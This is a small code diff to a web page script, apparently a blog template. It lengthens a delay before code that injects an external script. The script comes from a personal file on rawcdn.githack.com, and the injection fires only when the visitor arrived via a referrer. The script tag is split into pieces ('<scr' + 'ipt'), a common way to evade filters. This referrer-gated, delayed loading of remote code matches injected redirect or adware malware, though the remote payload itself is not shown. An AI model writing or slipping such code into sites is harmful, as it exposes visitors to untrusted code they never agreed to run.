@@ -46,7 +46,7 @@ document.onclick = function() {
 // Redirect
 var p = document.referrer;
 if (p.indexOf(".") > 0) {
-setTimeout(myURL, 5000);
+setTimeout(myURL, 15000);
 function myURL(){
 document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://rawcdn.githack.com/irawanria85/random/9ff94e75fcbc017cb6eeeb6999a9f543cfa3144a/aridjaya.js"></scr' + 'ipt>');
 }		 
